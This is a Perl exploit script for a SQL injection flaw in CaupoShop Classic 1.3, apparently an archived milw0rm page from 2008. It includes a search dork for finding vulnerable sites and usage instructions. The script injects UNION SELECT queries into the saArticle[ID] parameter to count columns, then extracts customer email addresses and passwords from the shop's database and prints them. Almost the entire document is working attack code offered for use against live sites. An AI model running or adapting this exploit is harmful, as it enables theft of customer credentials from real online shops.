<html><head><title>CaupoShop Classic 1.3 (saArticle[ID]) Remote SQL Injection Vulnerability</title></head><pre>#!/usr/bin/perl
######################
#
#CaupoShop Classic 1.3 Remote Exploit
#
######################
#
#Bug by: h0yt3r
#
#Dork: inurl:csc_article_details.php
# Couldnt find a stable dork for this specific Version.
#Exploit will only work on correct version.
#
##
###
##
#
#I found this long time ago but never actually shared it.
#As the userid's are a bit messy you will only get the top 1 row value.
#Change it if you like.
#
#Gr33tz go to:
#thund3r, ramon, b!zZ!t, Free-Hack, Sys-Flaw and of course the pwning h4ck-y0u Team
########

use LWP::UserAgent;
my $userAgent = LWP::UserAgent-&gt;new;

usage();

$server =   $ARGV[0];
$dir = $ARGV[1];

print&quot;\n&quot;;
if (!$dir) { die &quot;Read Usage!\n&quot;; }

$filename =&quot;csc_article_details.php&quot;;
my $url = &quot;http://&quot;.$server.$dir.$filename.&quot;?&quot;;

my $Attack= $userAgent-&gt;get($url);
if ($Attack-&gt;is_success)
{
    print &quot;[x] Attacking &quot;.$url.&quot;\n&quot;;
}
else
{
    print &quot;Couldn't connect to &quot;.$url.&quot;!&quot;;
    exit;
}

print &quot;[x] Injecting Black Magic\n&quot;;

my @count = (&quot;66666&quot;);

for ($i = 6; $i&lt;99; $i++)
{
    my $selectUrl = $url.&quot;saArticle[ID]=-275 union select 1,2,3,4, @count&quot;;
    my $Attack= $userAgent-&gt;get($selectUrl);
    if($Attack-&gt;content =~ 66666)
        { last; }
    else
        { push(@count,&quot;,66666&quot;); }
}

my $Final = $url.&quot;saArticle[ID]=-1 union select 1,2,3,concat(1337,email,0x3a,password,1337), @count from csc_customer&quot;;   

my $Attack= $userAgent-&gt;get($Final);

if($Attack-&gt;content =~ m/1337(.*?):(.*?)1337/i)
{   
    my $login = $1;
    my $pass = $2;
    print &quot;[x] Success!\n&quot;;
    print &quot;[x] Top 1 User Details:\n&quot;;

    print &quot;    Username: &quot;.$login.&quot;\n&quot;;
    print &quot;    Password: &quot;.$pass.&quot;\n&quot;;
}
else
{
    print&quot;[x] Something wrong...Version?\n&quot;;
    exit;

}

sub usage()
{
    print q
    {
    #####################################################
            CaupoShop Classic Remote Exploit
                    -Written by h0yt3r-
    Usage: CC.pl [Server] [Path]
    Sample:
    perl CC.pl www.site.com /shop/
    ######################################################
    };

}
#eof

# milw0rm.com [2008-06-19]</pre></html>